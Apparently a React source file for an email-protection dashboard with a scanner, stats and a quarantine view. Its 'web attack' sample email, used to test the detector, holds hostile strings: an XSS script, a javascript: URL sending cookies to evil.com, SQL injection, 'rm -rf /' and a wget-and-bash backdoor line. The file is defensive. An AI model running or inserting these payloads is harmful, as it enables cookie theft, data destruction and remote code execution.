import React, { useState, useEffect } from 'react';
import {
  Box,
  Paper,
  Typography,
  TextField,
  Button,
  Alert,
  Card,
  CardContent,
  Grid,
  Chip,
  LinearProgress,
  List,
  ListItem,
  ListItemText,
  ListItemIcon,
  Divider,
  Switch,
  FormControlLabel,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  Tab,
  Tabs,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  IconButton,
  Tooltip,
  Badge,
  Checkbox,
  MenuItem,
  Select,
  FormControl,
  InputLabel,
  InputAdornment
} from '@mui/material';
import {
  Email as EmailIcon,
  Warning as WarningIcon,
  CheckCircle as CheckCircleIcon,
  Block as BlockIcon,
  ExpandMore as ExpandMoreIcon,
  Attachment as AttachmentIcon,
  Link as LinkIcon,
  Person as PersonIcon,
  Shield as ShieldIcon,
  Security as SecurityIcon,
  VerifiedUser as VerifiedUserIcon,
  ReportProblem as ReportProblemIcon,
  Delete as DeleteIcon,
  Visibility as VisibilityIcon,
  Lock as LockIcon,
  Business as BusinessIcon,
  Download as DownloadIcon,
  Search as SearchIcon,
  FilterList as FilterListIcon,
  Sort as SortIcon,
  CheckBoxOutlineBlank as CheckBoxOutlineBlankIcon,
  CheckBox as CheckBoxIcon,
  ThumbUp as ThumbUpIcon
} from '@mui/icons-material';
import emailProtection from '../services/emailProtection';
import { toast } from 'react-hot-toast';

function EmailProtection() {
  const [emailData, setEmailData] = useState({
    from: '',
    displayName: '',
    subject: '',
    body: '',
    replyTo: ''
  });
  const [scanning, setScanning] = useState(false);
  const [scanResult, setScanResult] = useState(null);
  const [stats, setStats] = useState(null);
  const [protectionEnabled, setProtectionEnabled] = useState(true);
  const [tabValue, setTabValue] = useState(0);
  const [quarantine, setQuarantine] = useState([]);
  const [selectedQuarantine, setSelectedQuarantine] = useState(null);
  const [dialogOpen, setDialogOpen] = useState(false);
  const [selectedItems, setSelectedItems] = useState([]);
  const [filterThreat, setFilterThreat] = useState('all');
  const [sortBy, setSortBy] = useState('date');
  const [searchQuery, setSearchQuery] = useState('');

  useEffect(() => {
    loadStats();
    loadQuarantine();
    
    // Show feature highlight on first load
    const hasSeenHighlight = sessionStorage.getItem('emailProtectionHighlightSeen');
    if (!hasSeenHighlight) {
      setTimeout(() => {
        toast.success(
          '🛡️ Enhanced Protection Active!\n\n✓ Web Attack Blocking (XSS, SQL, Command Injection)\n✓ Unsafe Attachment Detection (60+ file types)\n✓ Real-time Threat Intelligence',
          { duration: 8000, position: 'top-center' }
        );
        sessionStorage.setItem('emailProtectionHighlightSeen', 'true');
      }, 1000);
    }
  }, []);

  const loadStats = () => {
    const currentStats = emailProtection.getStats();
    setStats(currentStats);
  };

  const loadQuarantine = () => {
    const items = emailProtection.getQuarantine();
    setQuarantine(items);
  };

  const getFilteredQuarantine = () => {
    let filtered = [...quarantine];

    // Filter by threat type
    if (filterThreat !== 'all') {
      filtered = filtered.filter(item => 
        item.scanResult.threats.some(t => t.type === filterThreat)
      );
    }

    // Search filter
    if (searchQuery) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter(item => 
        item.email.from.toLowerCase().includes(query) ||
        item.email.subject.toLowerCase().includes(query) ||
        (item.email.displayName && item.email.displayName.toLowerCase().includes(query))
      );
    }

    // Sort
    filtered.sort((a, b) => {
      if (sortBy === 'date') {
        return new Date(b.quarantinedAt) - new Date(a.quarantinedAt);
      } else if (sortBy === 'risk') {
        return b.scanResult.riskScore - a.scanResult.riskScore;
      } else if (sortBy === 'sender') {
        return a.email.from.localeCompare(b.email.from);
      }
      return 0;
    });

    return filtered;
  };

  const handleSelectAll = (checked) => {
    if (checked) {
      setSelectedItems(getFilteredQuarantine().map(item => item.id));
    } else {
      setSelectedItems([]);
    }
  };

  const handleSelectItem = (id) => {
    setSelectedItems(prev => 
      prev.includes(id) ? prev.filter(i => i !== id) : [...prev, id]
    );
  };

  const handleDeleteSelected = () => {
    selectedItems.forEach(id => emailProtection.removeFromQuarantine(id));
    loadQuarantine();
    setSelectedItems([]);
    toast.success(`Deleted ${selectedItems.length} email(s)`);
  };

  const handleMarkSafe = (item) => {
    emailProtection.addTrustedSender(item.email.from);
    emailProtection.removeFromQuarantine(item.id);
    loadQuarantine();
    setDialogOpen(false);
    toast.success('Sender added to trusted list');
  };

  const handleExportQuarantine = () => {
    const dataStr = JSON.stringify(quarantine, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(dataBlob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `quarantine-${new Date().toISOString().split('T')[0]}.json`;
    link.click();
    URL.revokeObjectURL(url);
    toast.success('Quarantine exported');
  };

  const getThreatTypeStats = () => {
    const stats = {};
    quarantine.forEach(item => {
      item.scanResult.threats.forEach(threat => {
        stats[threat.type] = (stats[threat.type] || 0) + 1;
      });
    });
    return stats;
  };

  const handleScanEmail = async () => {
    if (!emailData.from || !emailData.subject) {
      toast.error('Please enter at least sender and subject');
      return;
    }

    setScanning(true);
    setScanResult(null);

    try {
      const result = await emailProtection.scanEmail(emailData);
      setScanResult(result);
      loadStats();
      loadQuarantine();

      if (result.safe) {
        toast.success('✅ Email appears safe!');
      } else {
        toast.error(`⚠️ ${result.threats.length} threat(s) detected!`);
      }
    } catch (error) {
      toast.error('Scan failed: ' + error.message);
    } finally {
      setScanning(false);
    }
  };

  const handleToggleProtection = (event) => {
    const enabled = event.target.checked;
    setProtectionEnabled(enabled);
    emailProtection.setEnabled(enabled);
    toast.success(enabled ? 'Email Protection Enabled' : 'Email Protection Disabled');
  };

  const getSeverityColor = (severity) => {
    switch (severity) {
      case 'critical': return 'error';
      case 'high': return 'warning';
      case 'medium': return 'info';
      case 'low': return 'success';
      default: return 'default';
    }
  };

  const getRiskColor = (score) => {
    if (score >= 75) return 'error';
    if (score >= 50) return 'warning';
    if (score >= 25) return 'info';
    return 'success';
  };

  const loadSamplePhishing = () => {
    setEmailData({
      from: 'security@paypa1.com',
      displayName: 'PayPal Security Team',
      subject: 'URGENT: Your account has been suspended - Verify immediately!',
      body: 'Dear customer,\n\nYour PayPal account has been suspended due to unusual activity. Click here to verify your account immediately or your account will be permanently closed.\n\nVerify now: http://192.168.1.1/paypal-verify\n\nPayPal Security',
      replyTo: 'noreply@suspicious-domain.com',
      attachments: []
    });
    toast('Sample phishing email loaded', { icon: '⚠️' });
  };

  const loadSampleBEC = () => {
    setEmailData({
      from: 'ceo@external-mail.tk',
      displayName: 'John Smith - CEO',
      subject: 'Urgent: Confidential Wire Transfer Needed',
      body: 'Hi,\n\nI need you to process an urgent wire transfer for a confidential acquisition. The deal is time-sensitive.\n\nAmount: $45,000\nRecipient: Global Investments LLC\nBank account details attached.\n\nPlease handle this discreetly and do not share with anyone. I am in a meeting and cannot be reached by phone.\n\nRegards,\nJohn Smith\nCEO',
      replyTo: 'j.smith.personal@gmail.com',
      attachments: []
    });
    toast('Sample BEC (Business Email Compromise) loaded', { icon: '🎯' });
  };

  const loadSampleSafe = () => {
    setEmailData({
      from: 'newsletter@github.com',
      displayName: 'GitHub',
      subject: 'Your weekly GitHub digest',
      body: 'Hello,\n\nHere is your weekly summary of activity on GitHub.\n\nView your dashboard: https://github.com/dashboard\n\nThanks,\nThe GitHub Team',
      replyTo: '',
      attachments: []
    });
    toast('Sample safe email loaded', { icon: '✅' });
  };

  const loadSampleWebAttack = () => {
    setEmailData({
      from: 'attacker@malicious-site.tk',
      displayName: 'System Administrator',
      subject: 'URGENT: Security Update Required',
      body: `Dear User,

Your account requires immediate security update.

Click here to verify: <script>alert('XSS Attack')</script>

Or download this update: javascript:void(document.location='http://evil.com/steal?cookie='+document.cookie)

Please update your account information:
Email: ' OR '1'='1' --
Password: admin' UNION SELECT * FROM users --

Execute system update:
; rm -rf / 
| wget http://malicious.com/backdoor.sh && bash backdoor.sh

This is urgent and confidential. Do not share this email.

Best regards,
IT Security Team`,
      replyTo: 'noreply@external-mail.tk',
      attachments: [
        { name: 'invoice.pdf.exe', size: 2458923, type: 'application/exe' },
        { name: 'document.docm', size: 458923, type: 'application/vnd.ms-word.document.macroEnabled.12' },
        { name: 'update.bat', size: 12345, type: 'application/bat' },
        { name: 'crack_keygen.zip', size: 5892345, type: 'application/zip' }
      ]
    });
    toast('Sample web attack email with dangerous attachments loaded', { icon: '⚠️' });
  };

  return (
    <Box>
      {/* Header */}
      <Box mb={3} display="flex" justifyContent="space-between" alignItems="center">
        <Box>
          <Typography variant="h4" gutterBottom>
            <ShieldIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
            Enhanced Email Protection
          </Typography>
          <Typography variant="body2" color="text.secondary">
            Advanced spam, phishing, BEC detection with email authentication analysis
          </Typography>
        </Box>
        <FormControlLabel
          control={
            <Switch
              checked={protectionEnabled}
              onChange={handleToggleProtection}
              color="primary"
            />
          }
          label="Protection Enabled"
        />
      </Box>

      {/* Tabs */}
      <Box sx={{ borderBottom: 1, borderColor: 'divider', mb: 3 }}>
        <Tabs value={tabValue} onChange={(e, v) => setTabValue(v)}>
          <Tab label="Scan Email" icon={<EmailIcon />} iconPosition="start" />
          <Tab 
            label={
              <Badge badgeContent={quarantine.length} color="error">
                Quarantine
              </Badge>
            } 
            icon={<LockIcon />} 
            iconPosition="start" 
          />
        </Tabs>
      </Box>

      {/* Statistics Cards */}
      {stats && tabValue === 0 && (
        <Grid container spacing={2} mb={3}>
          <Grid item xs={12} sm={6} md={2.4}>
            <Card>
              <CardContent sx={{ textAlign: 'center' }}>
                <EmailIcon color="primary" sx={{ fontSize: 40, mb: 1 }} />
                <Typography color="text.secondary" variant="body2">
                  Scanned
                </Typography>
                <Typography variant="h5">{stats.totalScanned}</Typography>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} sm={6} md={2.4}>
            <Card>
              <CardContent sx={{ textAlign: 'center' }}>
                <WarningIcon color="warning" sx={{ fontSize: 40, mb: 1 }} />
                <Typography color="text.secondary" variant="body2">
                  Spam
                </Typography>
                <Typography variant="h5" color="warning.main">
                  {stats.spamDetected}
                </Typography>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} sm={6} md={2.4}>
            <Card>
              <CardContent sx={{ textAlign: 'center' }}>
                <SecurityIcon color="error" sx={{ fontSize: 40, mb: 1 }} />
                <Typography color="text.secondary" variant="body2">
                  Phishing
                </Typography>
                <Typography variant="h5" color="error.main">
                  {stats.phishingDetected}
                </Typography>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} sm={6} md={2.4}>
            <Card>
              <CardContent sx={{ textAlign: 'center' }}>
                <BusinessIcon color="error" sx={{ fontSize: 40, mb: 1 }} />
                <Typography color="text.secondary" variant="body2">
                  BEC
                </Typography>
                <Typography variant="h5" color="error.main">
                  {stats.becDetected}
                </Typography>
              </CardContent>
            </Card>
          </Grid>
          <Grid item xs={12} sm={6} md={2.4}>
            <Card>
              <CardContent sx={{ textAlign: 'center' }}>
                <LockIcon color="warning" sx={{ fontSize: 40, mb: 1 }} />
                <Typography color="text.secondary" variant="body2">
                  Quarantined
                </Typography>
                <Typography variant="h5" color="warning.main">
                  {stats.quarantineSize}
                </Typography>
              </CardContent>
            </Card>
          </Grid>
        </Grid>
      )}

      {/* Email Scanner */}
      {tabValue === 0 && (
        <>
          <Paper sx={{ p: 3, mb: 3 }}>
            <Box display="flex" justifyContent="space-between" alignItems="center" mb={2} flexWrap="wrap" gap={1}>
              <Typography variant="h6">
                <ShieldIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
                Scan Email
              </Typography>
              <Box display="flex" gap={1} flexWrap="wrap">
                <Button size="small" onClick={loadSampleSafe} variant="outlined">
                  Safe Sample
                </Button>
                <Button size="small" onClick={loadSamplePhishing} color="warning" variant="outlined">
                  Phishing Sample
                </Button>
                <Button size="small" onClick={loadSampleBEC} color="error" variant="outlined">
                  BEC Sample
                </Button>
                <Button size="small" onClick={loadSampleWebAttack} color="error" variant="contained">
                  Web Attack + Malware
                </Button>
              </Box>
            </Box>

        <Grid container spacing={2}>
          <Grid item xs={12} sm={6}>
            <TextField
              fullWidth
              label="From Email"
              value={emailData.from}
              onChange={(e) => setEmailData({ ...emailData, from: e.target.value })}
              placeholder="sender@example.com"
              disabled={scanning || !protectionEnabled}
            />
          </Grid>
          <Grid item xs={12} sm={6}>
            <TextField
              fullWidth
              label="Display Name (optional)"
              value={emailData.displayName}
              onChange={(e) => setEmailData({ ...emailData, displayName: e.target.value })}
              placeholder="John Doe"
              disabled={scanning || !protectionEnabled}
            />
          </Grid>
          <Grid item xs={12}>
            <TextField
              fullWidth
              label="Subject"
              value={emailData.subject}
              onChange={(e) => setEmailData({ ...emailData, subject: e.target.value })}
              placeholder="Email subject"
              disabled={scanning || !protectionEnabled}
            />
          </Grid>
          <Grid item xs={12}>
            <TextField
              fullWidth
              multiline
              rows={6}
              label="Email Body"
              value={emailData.body}
              onChange={(e) => setEmailData({ ...emailData, body: e.target.value })}
              placeholder="Email content..."
              disabled={scanning || !protectionEnabled}
            />
          </Grid>
          <Grid item xs={12}>
            <TextField
              fullWidth
              label="Reply-To (optional)"
              value={emailData.replyTo}
              onChange={(e) => setEmailData({ ...emailData, replyTo: e.target.value })}
              placeholder="reply@example.com"
              disabled={scanning || !protectionEnabled}
            />
          </Grid>
        </Grid>

        <Box mt={2}>
          <Button
            variant="contained"
            onClick={handleScanEmail}
            disabled={scanning || !protectionEnabled}
            fullWidth
          >
            {scanning ? 'Scanning Email...' : 'Scan Email for Threats'}
          </Button>
        </Box>

        {scanning && (
          <Box mt={2}>
            <LinearProgress />
            <Typography variant="body2" color="text.secondary" mt={1}>
              Analyzing email for spam, phishing, and threats...
            </Typography>
          </Box>
        )}
      </Paper>

      {/* Scan Results */}
      {scanResult && (
        <Paper sx={{ p: 3, mb: 3 }}>
          <Typography variant="h6" gutterBottom>
            Scan Results
          </Typography>

          <Alert 
            severity={scanResult.recommendation.color}
            icon={scanResult.safe ? <CheckCircleIcon /> : <WarningIcon />}
            sx={{ mb: 2 }}
          >
            <Typography variant="body1">
              <strong>{scanResult.recommendation.action.toUpperCase()}:</strong> {scanResult.recommendation.message}
            </Typography>
          </Alert>

          <Box mb={2}>
            <Typography variant="body2" color="text.secondary" gutterBottom>
              Risk Score
            </Typography>
            <Box display="flex" alignItems="center" gap={2}>
              <Box sx={{ flexGrow: 1 }}>
                <LinearProgress
                  variant="determinate"
                  value={scanResult.riskScore}
                  color={getRiskColor(scanResult.riskScore)}
                  sx={{ height: 10, borderRadius: 5 }}
                />
              </Box>
              <Typography variant="h6" color={getRiskColor(scanResult.riskScore) + '.main'}>
                {scanResult.riskScore}/100
              </Typography>
            </Box>
          </Box>

          {scanResult.threats.length > 0 && (
            <Box>
              <Typography variant="subtitle1" gutterBottom>
                Detected Threats:
              </Typography>
              
              {scanResult.threats.map((threat, index) => (
                <Accordion key={index}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Box display="flex" alignItems="center" gap={2} width="100%">
                      <WarningIcon color={getSeverityColor(threat.severity)} />
                      <Typography sx={{ flexGrow: 1 }}>{threat.description}</Typography>
                      <Chip
                        label={threat.severity.toUpperCase()}
                        size="small"
                        color={getSeverityColor(threat.severity)}
                      />
                      <Chip
                        label={threat.type}
                        size="small"
                        variant="outlined"
                      />
                    </Box>
                  </AccordionSummary>
                  <AccordionDetails>
                    {threat.indicators && (
                      <Box mb={1}>
                        <Typography variant="body2" color="text.secondary">
                          Indicators:
                        </Typography>
                        <List dense>
                          {threat.indicators.map((indicator, i) => (
                            <ListItem key={i}>
                              <ListItemText primary={`• ${indicator}`} />
                            </ListItem>
                          ))}
                        </List>
                      </Box>
                    )}
                    {threat.matchedKeywords && (
                      <Box mb={1}>
                        <Typography variant="body2" color="text.secondary">
                          Matched Keywords:
                        </Typography>
                        <Box display="flex" flexWrap="wrap" gap={1} mt={1}>
                          {threat.matchedKeywords.map((keyword, i) => (
                            <Chip key={i} label={keyword} size="small" />
                          ))}
                        </Box>
                      </Box>
                    )}
                    {threat.files && (
                      <Box>
                        <Typography variant="body2" color="text.secondary">
                          Dangerous Files:
                        </Typography>
                        <List dense>
                          {threat.files.map((file, i) => (
                            <ListItem key={i}>
                              <ListItemIcon>
                                <AttachmentIcon color="error" />
                              </ListItemIcon>
                              <ListItemText
                                primary={file.name}
                                secondary={file.reason}
                              />
                            </ListItem>
                          ))}
                        </List>
                      </Box>
                    )}
                    {threat.links && (
                      <Box>
                        <Typography variant="body2" color="text.secondary">
                          Suspicious Links:
                        </Typography>
                        <List dense>
                          {threat.links.map((link, i) => (
                            <ListItem key={i}>
                              <ListItemIcon>
                                <LinkIcon color="warning" />
                              </ListItemIcon>
                              <ListItemText
                                primary={link.url}
                                secondary={link.reason}
                              />
                            </ListItem>
                          ))}
                        </List>
                      </Box>
                    )}
                  </AccordionDetails>
                </Accordion>
              ))}
            </Box>
          )}

          {/* Email Authentication Details */}
          {scanResult.analysisDetails && scanResult.analysisDetails.headerAuthentication && (
            <Box mt={3}>
              <Divider sx={{ my: 2 }} />
              <Typography variant="subtitle1" gutterBottom>
                <VerifiedUserIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
                Email Authentication
              </Typography>
              <Grid container spacing={1} mt={1}>
                {scanResult.analysisDetails.headerAuthentication.details.map((detail, i) => {
                  const isPassed = detail.includes('PASS');
                  return (
                    <Grid item xs={12} sm={4} key={i}>
                      <Chip
                        label={detail}
                        color={isPassed ? 'success' : 'error'}
                        size="small"
                        icon={isPassed ? <CheckCircleIcon /> : <WarningIcon />}
                        sx={{ width: '100%' }}
                      />
                    </Grid>
                  );
                })}
              </Grid>
            </Box>
          )}

          <Typography variant="caption" color="text.secondary" display="block" mt={2}>
            Scanned at: {new Date(scanResult.scannedAt).toLocaleString()}
          </Typography>
        </Paper>
      )}

      {/* Protection Info */}
      {tabValue === 0 && (
        <Paper sx={{ p: 3 }}>
          <Typography variant="h6" gutterBottom>
            <ShieldIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
            Advanced Protection Features
          </Typography>
          
          {/* Highlight Web Attack & Attachment Protection */}
          <Grid container spacing={2} mb={3}>
            <Grid item xs={12} md={6}>
              <Card sx={{ bgcolor: 'error.dark', color: 'white', height: '100%' }}>
                <CardContent>
                  <Box display="flex" alignItems="center" mb={1}>
                    <SecurityIcon sx={{ fontSize: 40, mr: 2 }} />
                    <Box>
                      <Typography variant="h6" fontWeight="bold">
                        🛡️ Web Attack Protection
                      </Typography>
                      <Typography variant="body2">
                        {stats?.webAttacksBlocked || 0} attacks blocked
                      </Typography>
                    </Box>
                  </Box>
                  <Typography variant="body2" sx={{ opacity: 0.9 }}>
                    ✓ XSS (Cross-Site Scripting) blocking<br/>
                    ✓ SQL Injection detection<br/>
                    ✓ Command Injection prevention<br/>
                    ✓ HTML smuggling detection<br/>
                    ✓ Macro injection blocking
                  </Typography>
                </CardContent>
              </Card>
            </Grid>
            <Grid item xs={12} md={6}>
              <Card sx={{ bgcolor: 'warning.dark', color: 'white', height: '100%' }}>
                <CardContent>
                  <Box display="flex" alignItems="center" mb={1}>
                    <AttachmentIcon sx={{ fontSize: 40, mr: 2 }} />
                    <Box>
                      <Typography variant="h6" fontWeight="bold">
                        🔒 Unsafe Attachment Blocking
                      </Typography>
                      <Typography variant="body2">
                        {stats?.dangerousAttachmentsBlocked || 0} dangerous files blocked
                      </Typography>
                    </Box>
                  </Box>
                  <Typography variant="body2" sx={{ opacity: 0.9 }}>
                    ✓ Executable files (.exe, .scr, .bat)<br/>
                    ✓ Script files (.js, .vbs, .ps1)<br/>
                    ✓ Office macros (.docm, .xlsm)<br/>
                    ✓ Mobile malware (.apk, .deb)<br/>
                    ✓ Suspicious archives and double extensions
                  </Typography>
                </CardContent>
              </Card>
            </Grid>
          </Grid>

          {/* Additional Protection Features */}
          <Typography variant="subtitle1" gutterBottom fontWeight="bold" sx={{ mt: 2, mb: 1 }}>
            Additional Protection Layers
          </Typography>
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6} md={4}>
              <List dense>
                <ListItem>
                  <ListItemIcon>
                    <CheckCircleIcon color="success" />
                  </ListItemIcon>
                  <ListItemText primary="Spam Detection" secondary={`${stats?.spamKeywords || 0} keywords monitored`} />
                </ListItem>
                <ListItem>
                  <ListItemIcon>
                    <CheckCircleIcon color="success" />
                  </ListItemIcon>
                  <ListItemText primary="Phishing Detection" secondary={`${stats?.phishingIndicators || 0} indicators tracked`} />
                </ListItem>
                <ListItem>
                  <ListItemIcon>
                    <CheckCircleIcon color="success" />
                  </ListItemIcon>
                  <ListItemText primary="BEC Detection" secondary={`${stats?.becIndicators || 0} indicators monitored`} />
                </ListItem>
              </List>
            </Grid>
            <Grid item xs={12} sm={6} md={4}>
              <List dense>
                <ListItem>
                  <ListItemIcon>
                    <CheckCircleIcon color="success" />
                  </ListItemIcon>
                  <ListItemText primary="Link Scanning" secondary="Real-time URL reputation checking" />
                </ListItem>
                <ListItem>
                  <ListItemIcon>
                    <CheckCircleIcon color="success" />
                  </ListItemIcon>
                  <ListItemText primary="Spoofing Detection" secondary="Domain verification & homograph detection" />
                </ListItem>
                <ListItem>
                  <ListItemIcon>
                    <CheckCircleIcon color="success" />
                  </ListItemIcon>
                  <ListItemText primary="Email Authentication" secondary="SPF, DKIM, DMARC verification" />
                </ListItem>
              </List>
            </Grid>
            <Grid item xs={12} sm={6} md={4}>
              <List dense>
                <ListItem>
                  <ListItemIcon>
                    <CheckCircleIcon color="success" />
                  </ListItemIcon>
                  <ListItemText primary="Domain Reputation" secondary="Real-time DNS blocklist checking" />
                </ListItem>
                <ListItem>
                  <ListItemIcon>
                    <CheckCircleIcon color="success" />
                  </ListItemIcon>
                  <ListItemText primary="Sender Reputation" secondary={`${stats?.blockedSenders || 0} blocked, ${stats?.trustedSenders || 0} trusted`} />
                </ListItem>
                <ListItem>
                  <ListItemIcon>
                    <CheckCircleIcon color="success" />
                  </ListItemIcon>
                  <ListItemText primary="Advanced Patterns" secondary="AI-powered threat detection" />
                </ListItem>
              </List>
            </Grid>
          </Grid>
        </Paper>
      )}
      </>
      )}

      {/* Quarantine Tab */}
      {tabValue === 1 && (
        <Box>
          {/* Quarantine Statistics */}
          {quarantine.length > 0 && (
            <Grid container spacing={2} mb={3}>
              <Grid item xs={12}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="subtitle2" gutterBottom>Threat Distribution</Typography>
                  <Box display="flex" flexWrap="wrap" gap={1} mt={1}>
                    {Object.entries(getThreatTypeStats()).map(([type, count]) => (
                      <Chip
                        key={type}
                        label={`${type}: ${count}`}
                        size="small"
                        color="error"
                        variant="outlined"
                      />
                    ))}
                  </Box>
                </Paper>
              </Grid>
            </Grid>
          )}

          {/* Quarantine Controls */}
          <Paper sx={{ p: 3 }}>
            <Box display="flex" justifyContent="space-between" alignItems="center" mb={2} flexWrap="wrap" gap={2}>
              <Typography variant="h6">
                <LockIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
                Quarantined Emails ({getFilteredQuarantine().length}/{quarantine.length})
              </Typography>
              <Box display="flex" gap={1} flexWrap="wrap">
                {selectedItems.length > 0 && (
                  <Button
                    size="small"
                    color="error"
                    variant="contained"
                    startIcon={<DeleteIcon />}
                    onClick={handleDeleteSelected}
                  >
                    Delete Selected ({selectedItems.length})
                  </Button>
                )}
                {quarantine.length > 0 && (
                  <>
                    <Button
                      size="small"
                      variant="outlined"
                      startIcon={<DownloadIcon />}
                      onClick={handleExportQuarantine}
                    >
                      Export
                    </Button>
                    <Button
                      size="small"
                      color="error"
                      variant="outlined"
                      onClick={() => {
                        emailProtection.clearQuarantine();
                        loadQuarantine();
                        setSelectedItems([]);
                        toast.success('Quarantine cleared');
                      }}
                    >
                      Clear All
                    </Button>
                  </>
                )}
              </Box>
            </Box>

            {/* Filters and Search */}
            {quarantine.length > 0 && (
              <Grid container spacing={2} mb={2}>
                <Grid item xs={12} sm={4}>
                  <TextField
                    fullWidth
                    size="small"
                    placeholder="Search by sender or subject..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    InputProps={{
                      startAdornment: (
                        <InputAdornment position="start">
                          <SearchIcon />
                        </InputAdornment>
                      )
                    }}
                  />
                </Grid>
                <Grid item xs={12} sm={4}>
                  <FormControl fullWidth size="small">
                    <InputLabel>Filter by Threat</InputLabel>
                    <Select
                      value={filterThreat}
                      label="Filter by Threat"
                      onChange={(e) => setFilterThreat(e.target.value)}
                      startAdornment={<FilterListIcon sx={{ mr: 1, ml: 1 }} />}
                    >
                      <MenuItem value="all">All Threats</MenuItem>
                      <MenuItem value="phishing">Phishing</MenuItem>
                      <MenuItem value="spam">Spam</MenuItem>
                      <MenuItem value="business-email-compromise">BEC</MenuItem>
                      <MenuItem value="malicious-attachment">Malicious Attachments</MenuItem>
                      <MenuItem value="suspicious-links">Suspicious Links</MenuItem>
                      <MenuItem value="spoofing">Spoofing</MenuItem>
                    </Select>
                  </FormControl>
                </Grid>
                <Grid item xs={12} sm={4}>
                  <FormControl fullWidth size="small">
                    <InputLabel>Sort By</InputLabel>
                    <Select
                      value={sortBy}
                      label="Sort By"
                      onChange={(e) => setSortBy(e.target.value)}
                      startAdornment={<SortIcon sx={{ mr: 1, ml: 1 }} />}
                    >
                      <MenuItem value="date">Date (Newest First)</MenuItem>
                      <MenuItem value="risk">Risk Score (Highest First)</MenuItem>
                      <MenuItem value="sender">Sender (A-Z)</MenuItem>
                    </Select>
                  </FormControl>
                </Grid>
              </Grid>
            )}

            {/* Quarantine Table */}
            {quarantine.length === 0 ? (
              <Alert severity="success" icon={<CheckCircleIcon />}>
                <Typography>No emails in quarantine. All scanned emails were safe.</Typography>
              </Alert>
            ) : getFilteredQuarantine().length === 0 ? (
              <Alert severity="info">
                <Typography>No emails match your search or filter criteria.</Typography>
              </Alert>
            ) : (
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell padding="checkbox">
                        <Checkbox
                          checked={selectedItems.length === getFilteredQuarantine().length}
                          indeterminate={selectedItems.length > 0 && selectedItems.length < getFilteredQuarantine().length}
                          onChange={(e) => handleSelectAll(e.target.checked)}
                        />
                      </TableCell>
                      <TableCell>Date</TableCell>
                      <TableCell>From</TableCell>
                      <TableCell>Subject</TableCell>
                      <TableCell>Risk Score</TableCell>
                      <TableCell>Threats</TableCell>
                      <TableCell align="right">Actions</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {getFilteredQuarantine().map((item) => (
                      <TableRow 
                        key={item.id}
                        hover
                        selected={selectedItems.includes(item.id)}
                      >
                        <TableCell padding="checkbox">
                          <Checkbox
                            checked={selectedItems.includes(item.id)}
                            onChange={() => handleSelectItem(item.id)}
                          />
                        </TableCell>
                        <TableCell>
                          <Typography variant="body2">
                            {new Date(item.quarantinedAt).toLocaleDateString()}
                          </Typography>
                          <Typography variant="caption" color="text.secondary">
                            {new Date(item.quarantinedAt).toLocaleTimeString()}
                          </Typography>
                        </TableCell>
                        <TableCell>
                          <Typography variant="body2" fontWeight="medium">
                            {item.email.displayName || item.email.from}
                          </Typography>
                          <Typography variant="caption" color="text.secondary">
                            {item.email.from}
                          </Typography>
                        </TableCell>
                        <TableCell>
                          <Typography 
                            variant="body2" 
                            sx={{ 
                              maxWidth: 300, 
                              overflow: 'hidden', 
                              textOverflow: 'ellipsis', 
                              whiteSpace: 'nowrap' 
                            }}
                          >
                            {item.email.subject}
                          </Typography>
                        </TableCell>
                        <TableCell>
                          <Chip
                            label={`${item.scanResult.riskScore}/100`}
                            color={getRiskColor(item.scanResult.riskScore)}
                            size="small"
                          />
                        </TableCell>
                        <TableCell>
                          <Box display="flex" flexWrap="wrap" gap={0.5}>
                            {item.scanResult.threats.slice(0, 2).map((threat, i) => (
                              <Chip
                                key={i}
                                label={threat.type.split('-').join(' ')}
                                color={getSeverityColor(threat.severity)}
                                size="small"
                                variant="outlined"
                              />
                            ))}
                            {item.scanResult.threats.length > 2 && (
                              <Chip
                                label={`+${item.scanResult.threats.length - 2}`}
                                size="small"
                                variant="outlined"
                              />
                            )}
                          </Box>
                        </TableCell>
                        <TableCell align="right">
                          <Tooltip title="View Details">
                            <IconButton
                              size="small"
                              onClick={() => {
                                setSelectedQuarantine(item);
                                setDialogOpen(true);
                              }}
                            >
                              <VisibilityIcon />
                            </IconButton>
                          </Tooltip>
                          <Tooltip title="Delete">
                            <IconButton
                              size="small"
                              color="error"
                              onClick={() => {
                                emailProtection.removeFromQuarantine(item.id);
                                loadQuarantine();
                                setSelectedItems(prev => prev.filter(id => id !== item.id));
                                toast.success('Email removed from quarantine');
                              }}
                            >
                              <DeleteIcon />
                            </IconButton>
                          </Tooltip>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            )}
          </Paper>
        </Box>
      )}

      {/* Enhanced Quarantine Detail Dialog */}
      <Dialog open={dialogOpen} onClose={() => setDialogOpen(false)} maxWidth="md" fullWidth>
        {selectedQuarantine && (
          <>
            <DialogTitle>
              <Box display="flex" alignItems="center" justifyContent="space-between">
                <Box>
                  <Typography variant="h6">Quarantined Email Analysis</Typography>
                  <Typography variant="caption" color="text.secondary">
                    Quarantined on {new Date(selectedQuarantine.quarantinedAt).toLocaleString()}
                  </Typography>
                </Box>
                <Chip
                  label={selectedQuarantine.scanResult.recommendation.action.toUpperCase()}
                  color={selectedQuarantine.scanResult.recommendation.color}
                  size="small"
                />
              </Box>
            </DialogTitle>
            <DialogContent>
              {/* Risk Score */}
              <Box mb={3}>
                <Box display="flex" justifyContent="space-between" alignItems="center" mb={1}>
